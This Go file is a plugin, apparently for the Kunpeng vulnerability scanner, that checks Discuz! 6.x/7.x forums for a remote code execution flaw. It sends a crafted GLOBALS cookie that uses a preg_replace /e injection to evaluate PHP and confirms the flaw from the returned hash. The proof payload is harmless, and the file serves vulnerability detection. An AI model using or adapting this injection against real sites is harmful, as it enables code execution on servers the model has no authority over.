package goplugin

import (
	"net/http"
	"regexp"
	"strings"
	"github.com/opensec-cn/kunpeng/util"
	"github.com/opensec-cn/kunpeng/plugin"
)

type discuz7xRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("discuz", &discuz7xRCE{})
}
func (d *discuz7xRCE) Init() plugin.Plugin{
	d.info = plugin.Plugin{
		Name:    "Discuz! 6.x/7.x 代码执行",
		Remarks: "Discuz! 6.x/7.x 全局变量防御绕过导致命令执行",
		Level:   0,
		Type:    "RCE",
		Author:   "wolf",
		References: plugin.References{
			URL: "https://github.com/vulhub/vulhub/tree/master/discuz/wooyun-2010-080723",
			CVE: "",
		},
	}
	return d.info
}
func (d *discuz7xRCE) GetResult() []plugin.Plugin {
	return d.result
}
func (d *discuz7xRCE) getTIDList(URL string) (tIDList []string) {
	request, err := http.NewRequest("GET", URL, nil)
	if err != nil {
		return
	}
	resp, err := util.RequestDo(request, false)
	if err != nil {
		return
	}
	regex, _ := regexp.Compile(`viewthread.php\?tid=(\d+)`)
	regex2, _ := regexp.Compile(`thread-(\d+)-`)
	mData := regex.FindAllStringSubmatch(string(resp.Body), -1)
	if len(mData) == 0 {
		mData = regex2.FindAllStringSubmatch(string(resp.Body), -1)
	}
	for _, v := range mData {
		tIDList = append(tIDList, v[1])
	}
	return
}
func (d *discuz7xRCE) Check(URL string, meta plugin.TaskMeta) bool {
	tIDList := d.getTIDList(URL)
	for i, id := range tIDList {
		if i >= 5 {
			break
		}
		pocURL := URL + "/viewthread.php?tid=" + id
		request, err := http.NewRequest("GET", pocURL, nil)
		if err != nil {
			return false
		}
		request.Header.Add("Cookie", "GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;GLOBALS[_DCACHE][smilies][replacearray]=print_r(md5(700))")
		resp, err := util.RequestDo(request, true)
		if err != nil {
			return false
		}
		if strings.Contains(resp.ResponseRaw, "e5841df2166dd424a57127423d276bbe") {
			result := d.info
			result.Response = resp.ResponseRaw
			result.Request = resp.RequestRaw
			d.result = append(d.result, result)
			return true
		}
	}
	return false
}
